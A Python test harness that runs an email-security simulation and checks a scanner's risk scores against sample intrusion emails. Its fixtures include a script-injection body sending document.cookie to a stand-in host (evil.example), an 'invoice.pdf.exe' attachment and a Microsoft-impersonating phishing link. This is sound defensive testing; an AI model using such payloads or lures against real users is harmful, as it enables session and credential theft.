#!/usr/bin/env python3
"""Run 1000-email security simulation and intrusion corpus checks.

  python3 scripts/simulate_email_security.py
  python3 scripts/simulate_email_security.py --count 1000 --junk-level strict
"""
from __future__ import annotations

import argparse
import json
import sys

sys.path.insert(0, '/workspace')

from email_security import run_simulation, scan_email_message


INTRUSION_CASES = [
    {
        'name': 'script_injection',
        'message': {
            'id': 'intrusion_script',
            'folder': 'inbox',
            'from': 'Attacker',
            'fromEmail': 'bad@evil.tk',
            'subject': 'Invoice',
            'body': '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
            'attachments': [],
        },
        'min_score': 25,
    },
    {
        'name': 'malware_attachment',
        'message': {
            'id': 'intrusion_malware',
            'folder': 'inbox',
            'from': 'Billing',
            'fromEmail': 'billing@fake-pay.xyz',
            'subject': 'Payment overdue',
            'body': '<p>Open the attachment immediately</p>',
            'attachments': [{'name': 'invoice.pdf.exe', 'size': '1.2 MB'}],
        },
        'min_score': 50,
    },
    {
        'name': 'credential_phish',
        'message': {
            'id': 'intrusion_phish',
            'folder': 'inbox',
            'from': 'Microsoft Account Team',
            'fromEmail': 'security@micros0ft-login.click',
            'subject': 'Verify your account immediately',
            'body': '<p>Your account was suspended. <a href="https://micros0ft-login.click/verify">Click here to verify your password</a></p>',
            'attachments': [],
        },
        'min_score': 40,
    },
    {
        'name': 'legitimate_internal',
        'message': {
            'id': 'legit_internal',
            'folder': 'inbox',
            'from': 'Sarah Chen',
            'fromEmail': 'sarah.chen@aldistores.com',
            'subject': 'Submittal log review',
            'body': '<p>Please review the submittal package when you have a moment.</p>',
            'attachments': [{'name': 'Submittal_Log.pdf', 'size': '2 MB'}],
        },
        'max_score': 25,
    },
]


def run_intrusion_checks() -> list[dict]:
    results = []
    for case in INTRUSION_CASES:
        scan = scan_email_message(case['message'], user_email='user@casepm.com')
        score = scan.risk_score
        ok = True
        if 'min_score' in case:
            ok = score >= case['min_score']
        if 'max_score' in case:
            ok = score <= case['max_score']
        results.append({
            'name': case['name'],
            'passed': ok,
            'score': score,
            'action': scan.action,
            'category': scan.category,
        })
    return results


def main():
    parser = argparse.ArgumentParser(description='Email security simulation harness')
    parser.add_argument('--count', type=int, default=1000)
    parser.add_argument('--junk-level', default='standard', choices=['low', 'standard', 'high', 'strict'])
    parser.add_argument('--json', action='store_true')
    args = parser.parse_args()

    sim = run_simulation(count=args.count, junk_level=args.junk_level)
    intrusion = run_intrusion_checks()
    intrusion_failures = [r for r in intrusion if not r['passed']]

    report = {
        'simulation': sim,
        'intrusion_checks': intrusion,
        'intrusion_passed': len(intrusion) - len(intrusion_failures),
        'intrusion_total': len(intrusion),
        'ok': (
            sim.get('threat_detection_rate', 0) >= 0.85
            and sim.get('legitimate_pass_rate', 0) >= 0.9
            and not intrusion_failures
        ),
    }

    if args.json:
        print(json.dumps(report, indent=2))
    else:
        print(f"Email security simulation ({args.count} messages, junk={args.junk_level})")
        print(f"  Threat detection rate: {sim.get('threat_detection_rate', 0):.1%}")
        print(f"  Legitimate pass rate:    {sim.get('legitimate_pass_rate', 0):.1%}")
        print(f"  Summary: {sim.get('summary')}")
        print(f"  Category breakdown:")
        for cat, stats in sorted((sim.get('by_category') or {}).items()):
            print(f"    {cat}: {stats}")
        print(f"  Mismatches: {sim.get('mismatch_count', 0)}")
        if sim.get('mismatches_sample'):
            print('  Sample mismatches:')
            for row in sim['mismatches_sample'][:5]:
                print(f"    - {row['id']} ({row['sim_category']}): expected {row['expected']}, got {row['actual']} score={row['score']}")
        print(f"Intrusion checks: {report['intrusion_passed']}/{report['intrusion_total']} passed")
        for row in intrusion:
            status = 'PASS' if row['passed'] else 'FAIL'
            print(f"  [{status}] {row['name']}: score={row['score']} action={row['action']} category={row['category']}")
        print('RESULT:', 'OK' if report['ok'] else 'FAILED')

    sys.exit(0 if report['ok'] else 1)


if __name__ == '__main__':
    main()
